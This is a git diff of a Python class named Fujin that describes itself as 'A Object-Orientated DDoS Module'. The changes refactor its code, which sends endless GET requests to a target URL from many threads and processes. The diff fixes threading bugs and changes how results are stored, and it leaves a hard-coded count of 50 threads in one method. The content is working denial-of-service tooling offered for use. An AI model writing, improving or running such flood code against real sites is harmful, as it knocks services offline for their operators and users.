@@ -7,7 +7,11 @@ import asyncio
 
 class Fujin:
 
-    def __init__(self, url: str, header: dict, proxies: dict, data: str) -> None:
+    def __init__(self, 
+                 url: str | None = None, 
+                 header: dict | None = None, 
+                 proxies: dict | None = None, 
+                 data: str | None = None) -> None:
         """
         A Object-Orientated DDoS Module
 
@@ -32,6 +36,8 @@ class Fujin:
 
         # Log
         self.connected = 0
+        self.result = None
+        self.status_code = None
 
         # Sessions and object to
         self.session = requests.session()
@@ -39,7 +45,6 @@ class Fujin:
         # Other
         self.cache_location = '.web_cache'
         self.cache_session = None
-        self.status_code = None
 
     
 
@@ -47,7 +52,7 @@ class Fujin:
     #
     # Async and Sync GET Requests
     #
-    async def async_get(self) -> tuple:
+    async def async_get(self) -> None:
 
         """
         A Normal GET request that uses the requests module
@@ -68,18 +73,18 @@ class Fujin:
         """
 
         # Send A GET Request
-        r = self.session.get(self.url, headers=self.header, proxies=self.proxies)
+        r = self.session.get(self.url, headers=self.header)
 
-        # Assign
+        # Assign to Object-Orientated Variable
         self.status_code = r.status_code
         self.connected += 1
+        self.result = self.connected, self.status_code
 
-        # Return a tuple
-        return (self.connected, self.status_code)
+        print(f"{self.result}")
     
 
 
-    def sync_get(self) -> tuple:
+    def sync_get(self) -> None:
 
         """
         A simple synchronous function that allows you to run a GET request
@@ -91,9 +96,9 @@ class Fujin:
         # Assign to Object-Orientated Variable
         self.status_code = r.status_code
         self.connected += 1
+        self.result = self.connected, self.status_code
 
-        # Return our OO Variables
-        return (self.connected, self.status_code)
+        print(f"{self.result}")
     
 
 
@@ -117,7 +122,8 @@ class Fujin:
         """
 
         while 1:
-            asyncio.run(self.async_get(self))
+            asyncio.run(self.async_get())
+
 
     def begin_sync_get_attack(self) -> None:
         while 1:
@@ -129,20 +135,20 @@ class Fujin:
     #
     # Threading Attacks
     #
-    def thread_async_attack(self, threads: int, daemon: bool) -> None:
+    def thread_async_attack(self, 
+                            threads: int | None=None, 
+                            daemon: bool | None=None) -> None:
         """
         Uses the threading module to speed up the attack, with as many threads as you like
         """
 
         for x in range(threads):
-            t = threading.Thread(target=self.begin_async_get_attack, args=[self])
-            t.daemon = True
-            self.threads.append(t)
-
+            t = threading.Thread(target=self.begin_async_get_attack, daemon=daemon)
+            self.async_threads.append(t)
         for x in range(threads):
-            self.threads[x].start()
+            self.async_threads[x].start()
         for x in range(threads):
-            self.threads[x].join()
+            self.async_threads[x].join()
 
     def thread_sync_attack(self, threads: int, daemon: bool) -> None:
         """
@@ -151,11 +157,11 @@ class Fujin:
 
         for x in range(threads):
             t = threading.Thread(target=self.begin_sync_attack, daemon=daemon)
-            self.threads.append(t)
+            self.sync_threads.append(t)
         for x in range(50):
-            self.threads[x].start()
+            self.sync_threads[x].start()
         for x in range(50):
-            self.threads[x].join()
+            self.sync_threads[x].join()
 
 
 
@@ -163,7 +169,9 @@ class Fujin:
     #
     # Multiprocessing Attacks
     #
-    def multiproc_sync_attack(self, number_of_processes: int, daemon: bool) -> None:
+    def multiproc_sync_attack(self, 
+                              number_of_processes: int | None = None, 
+                              daemon: bool | None = None) -> None:
         """
         Uses the multiprocessing function to speed up the attack.
         """
@@ -178,7 +186,9 @@ class Fujin:
         for x in range(numproc):
             self.sync_processes[x].join()
 
-    def multiproc_async_attack(self, number_of_processes: int, daemon: bool) -> None:
+    def multiproc_async_attack(self, 
+                               number_of_processes: int | None = None, 
+                               daemon: bool | None = None) -> None:
 
         """
         Uses the multiprocessing function to speed up the attack.
